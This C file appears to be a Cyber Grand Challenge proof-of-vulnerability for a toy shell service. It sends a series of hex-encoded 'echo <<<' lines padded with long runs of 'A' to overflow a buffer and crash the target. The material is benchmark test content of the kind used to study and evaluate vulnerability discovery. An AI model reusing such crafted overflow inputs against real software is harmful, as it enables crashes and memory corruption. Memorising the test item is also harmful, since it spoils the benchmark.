#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x65\x63\x68\x6f\x20\x3c\x3c\x3c\x69\x5c\x78\x3d\x65\x6b\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x20\x3e\x20\x20\x41\x41"
         "\x41\x41\x5c\x41\x41\x41\x41\x41\x41\x41\x0a";
      static unsigned int write_00000_00000_len = 59;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x65\x63\x68\x6f\x20\x3c\x3c\x3c\x55\x5c\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x20"
         "\x3e\x3e\x20\x20\x41\x41\x41\x41\x5c\x41\x41\x41\x41\x41\x41\x41"
         "\x0a";
      static unsigned int write_00001_00000_len = 49;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00002_00000[] = 
         "\x65\x63\x68\x6f\x20\x3c\x3c\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x20\x3e\x3e\x20\x20\x41\x41\x41\x41"
         "\x5c\x41\x41\x41\x41\x41\x41\x41\x0a";
      static unsigned int write_00002_00000_len = 41;
      unsigned char *write_00002 = NULL;
      unsigned int write_00002_len = 0;
      write_00002 = cgc_append_buf(write_00002, &write_00002_len, write_00002_00000, write_00002_00000_len);
      if (write_00002_len > 0) {
         cgc_transmit_all(1, write_00002, write_00002_len);
      }
      cgc_free(write_00002);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00003_00000[] = 
         "\x65\x63\x68\x6f\x20\x3c\x3c\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x20\x3e\x3e\x20\x20\x41\x41\x41\x41"
         "\x5c\x41\x41\x41\x41\x41\x41\x41\x0a";
      static unsigned int write_00003_00000_len = 41;
      unsigned char *write_00003 = NULL;
      unsigned int write_00003_len = 0;
      write_00003 = cgc_append_buf(write_00003, &write_00003_len, write_00003_00000, write_00003_00000_len);
      if (write_00003_len > 0) {
         cgc_transmit_all(1, write_00003, write_00003_len);
      }
      cgc_free(write_00003);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00004_00000[] = 
         "\x65\x63\x68\x6f\x20\x64\x2c\x65\x63\x68\x6f\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x20\x3e\x3e\x20\x20\x41\x41\x41\x41\x5c"
         "\x41\x41\x41\x41\x41\x41\x41\x0a";
      static unsigned int write_00004_00000_len = 40;
      unsigned char *write_00004 = NULL;
      unsigned int write_00004_len = 0;
      write_00004 = cgc_append_buf(write_00004, &write_00004_len, write_00004_00000, write_00004_00000_len);
      if (write_00004_len > 0) {
         cgc_transmit_all(1, write_00004, write_00004_len);
      }
      cgc_free(write_00004);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00005_00000[] = 
         "\x65\x63\x68\x6f\x20\x3c\x3c\x3c\x55\x5c\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x20\x3e\x3e\x20\x20\x41\x41\x41\x41\x5c\x41\x41\x41\x41\x41"
         "\x41\x41\x0a";
      static unsigned int write_00005_00000_len = 163;
      unsigned char *write_00005 = NULL;
      unsigned int write_00005_len = 0;
      write_00005 = cgc_append_buf(write_00005, &write_00005_len, write_00005_00000, write_00005_00000_len);
      if (write_00005_len > 0) {
         cgc_transmit_all(1, write_00005, write_00005_len);
      }
      cgc_free(write_00005);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00006_00000[] = 
         "\x65\x63\x68\x6f\x20\x3c\x3c\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x20\x3e\x3e\x20\x20\x41\x41\x41\x41"
         "\x5c\x41\x41\x41\x41\x41\x41\x41\x0a";
      static unsigned int write_00006_00000_len = 41;
      unsigned char *write_00006 = NULL;
      unsigned int write_00006_len = 0;
      write_00006 = cgc_append_buf(write_00006, &write_00006_len, write_00006_00000, write_00006_00000_len);
      if (write_00006_len > 0) {
         cgc_transmit_all(1, write_00006, write_00006_len);
      }
      cgc_free(write_00006);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00007_00000[] = 
         "\x65\x63\x68\x6f\x20\x3c\x3c\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x20\x3e\x3e\x20\x20\x41\x41\x41\x41"
         "\x5c\x41\x41\x41\x41\x41\x41\x41\x0a";
      static unsigned int write_00007_00000_len = 41;
      unsigned char *write_00007 = NULL;
      unsigned int write_00007_len = 0;
      write_00007 = cgc_append_buf(write_00007, &write_00007_len, write_00007_00000, write_00007_00000_len);
      if (write_00007_len > 0) {
         cgc_transmit_all(1, write_00007, write_00007_len);
      }
      cgc_free(write_00007);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00008_00000[] = 
         "\x65\x63\x68\x6f\x20\x3c\x3c\x3c\x55\x5c\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x20"
         "\x3e\x3e\x20\x20\x41\x41\x41\x41\x5c\x41\x41\x41\x41\x41\x41\x41"
         "\x0a";
      static unsigned int write_00008_00000_len = 49;
      unsigned char *write_00008 = NULL;
      unsigned int write_00008_len = 0;
      write_00008 = cgc_append_buf(write_00008, &write_00008_len, write_00008_00000, write_00008_00000_len);
      if (write_00008_len > 0) {
         cgc_transmit_all(1, write_00008, write_00008_len);
      }
      cgc_free(write_00008);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00009_00000[] = 
         "\x65\x63\x68\x6f\x20\x3c\x3c\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x20\x3e\x3e\x20\x20\x41\x41\x41\x41"
         "\x5c\x41\x41\x41\x41\x41\x41\x41\x0a";
      static unsigned int write_00009_00000_len = 41;
      unsigned char *write_00009 = NULL;
      unsigned int write_00009_len = 0;
      write_00009 = cgc_append_buf(write_00009, &write_00009_len, write_00009_00000, write_00009_00000_len);
      if (write_00009_len > 0) {
         cgc_transmit_all(1, write_00009, write_00009_len);
      }
      cgc_free(write_00009);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00010_00000[] = 
         "\x65\x63\x68\x6f\x20\x3c\x3c\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x20\x3e\x3e\x20\x20\x41\x41\x41\x41"
         "\x5c\x41\x41\x41\x41\x41\x41\x41\x0a";
      static unsigned int write_00010_00000_len = 41;
      unsigned char *write_00010 = NULL;
      unsigned int write_00010_len = 0;
      write_00010 = cgc_append_buf(write_00010, &write_00010_len, write_00010_00000, write_00010_00000_len);
      if (write_00010_len > 0) {
         cgc_transmit_all(1, write_00010, write_00010_len);
      }
      cgc_free(write_00010);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00011_00000[] = 
         "\x65\x63\x68\x6f\x20\x3c\x3c\x3c\x55\x5c\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x20"
         "\x3e\x3e\x20\x20\x41\x41\x41\x41\x5c\x41\x41\x41\x41\x41\x41\x41"
         "\x0a";
      static unsigned int write_00011_00000_len = 49;
      unsigned char *write_00011 = NULL;
      unsigned int write_00011_len = 0;
      write_00011 = cgc_append_buf(write_00011, &write_00011_len, write_00011_00000, write_00011_00000_len);
      if (write_00011_len > 0) {
         cgc_transmit_all(1, write_00011, write_00011_len);
      }
      cgc_free(write_00011);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00012_00000[] = 
         "\x65\x63\x68\x6f\x20\x3c\x3c\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x20\x3e\x3e\x20\x20\x41\x41\x41\x41"
         "\x5c\x41\x41\x41\x41\x41\x41\x41\x0a";
      static unsigned int write_00012_00000_len = 41;
      unsigned char *write_00012 = NULL;
      unsigned int write_00012_len = 0;
      write_00012 = cgc_append_buf(write_00012, &write_00012_len, write_00012_00000, write_00012_00000_len);
      if (write_00012_len > 0) {
         cgc_transmit_all(1, write_00012, write_00012_len);
      }
      cgc_free(write_00012);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00013_00000[] = 
         "\x65\x63\x68\x6f\x20\x3c\x3c\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x20\x3e\x3e\x20\x20\x41\x41\x41\x41"
         "\x5c\x41\x41\x41\x41\x41\x41\x41\x0a";
      static unsigned int write_00013_00000_len = 41;
      unsigned char *write_00013 = NULL;
      unsigned int write_00013_len = 0;
      write_00013 = cgc_append_buf(write_00013, &write_00013_len, write_00013_00000, write_00013_00000_len);
      if (write_00013_len > 0) {
         cgc_transmit_all(1, write_00013, write_00013_len);
      }
      cgc_free(write_00013);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00014_00000[] = 
         "\x65\x63\x68\x6f\x20\x3c\x3c\xfd\x55\x5c\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x20"
         "\x3e\x3e\x20\x20\x41\x41\x41\x41\x5c\x41\x41\x41\x41\x41\x41\x41"
         "\x0a";
      static unsigned int write_00014_00000_len = 49;
      unsigned char *write_00014 = NULL;
      unsigned int write_00014_len = 0;
      write_00014 = cgc_append_buf(write_00014, &write_00014_len, write_00014_00000, write_00014_00000_len);
      if (write_00014_len > 0) {
         cgc_transmit_all(1, write_00014, write_00014_len);
      }
      cgc_free(write_00014);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00015_00000[] = 
         "\x65\x63\x68\x6f\x20\x3c\x3c\x3c\x55\x5c\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x20"
         "\x3e\x3e\x20\x20\x41\x41\x41\x41\x5c\x41\x41\x41\x41\x41\x41\x41"
         "\x0a";
      static unsigned int write_00015_00000_len = 49;
      unsigned char *write_00015 = NULL;
      unsigned int write_00015_len = 0;
      write_00015 = cgc_append_buf(write_00015, &write_00015_len, write_00015_00000, write_00015_00000_len);
      if (write_00015_len > 0) {
         cgc_transmit_all(1, write_00015, write_00015_len);
      }
      cgc_free(write_00015);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00016_00000[] = 
         "\x65\x63\x68\x6f\x20\x3c\x3c\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x20\x3e\x3e\x20\x20\x41\x41\x41\x41"
         "\x5c\x41\x41\x41\x41\x41\x41\x41\x0a";
      static unsigned int write_00016_00000_len = 41;
      unsigned char *write_00016 = NULL;
      unsigned int write_00016_len = 0;
      write_00016 = cgc_append_buf(write_00016, &write_00016_len, write_00016_00000, write_00016_00000_len);
      if (write_00016_len > 0) {
         cgc_transmit_all(1, write_00016, write_00016_len);
      }
      cgc_free(write_00016);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00017_00000[] = 
         "\x65\x63\x68\x6f\x20\x3c\x3c\x3c\x55\x5c\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x20"
         "\x3e\x3e\x20\x20\x41\x41\x41\x41\x5c\x41\x41\x41\x41\x41\x41\x41"
         "\x0a";
      static unsigned int write_00017_00000_len = 49;
      unsigned char *write_00017 = NULL;
      unsigned int write_00017_len = 0;
      write_00017 = cgc_append_buf(write_00017, &write_00017_len, write_00017_00000, write_00017_00000_len);
      if (write_00017_len > 0) {
         cgc_transmit_all(1, write_00017, write_00017_len);
      }
      cgc_free(write_00017);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00018_00000[] = 
         "\x65\x63\x68\x6f\x20\x3c\x3c\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x20\x3e\x3e\x20\x20\x41\x41\x41\x41"
         "\x5c\x41\x41\x41\x41\x41\x41\x41\x0a";
      static unsigned int write_00018_00000_len = 41;
      unsigned char *write_00018 = NULL;
      unsigned int write_00018_len = 0;
      write_00018 = cgc_append_buf(write_00018, &write_00018_len, write_00018_00000, write_00018_00000_len);
      if (write_00018_len > 0) {
         cgc_transmit_all(1, write_00018, write_00018_len);
      }
      cgc_free(write_00018);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** length read
      read_00000_len = 1;
      read_00000 = (unsigned char*)cgc_malloc(read_00000_len);
      int read_00000_res = cgc_length_read(0, read_00000, read_00000_len);
      if (read_00000_res) {} //silence unused variable warning
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** length read
      read_00001_len = 1;
      read_00001 = (unsigned char*)cgc_malloc(read_00001_len);
      int read_00001_res = cgc_length_read(0, read_00001, read_00001_len);
      if (read_00001_res) {} //silence unused variable warning
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   //*** delay
   cgc_delay(1000);
}
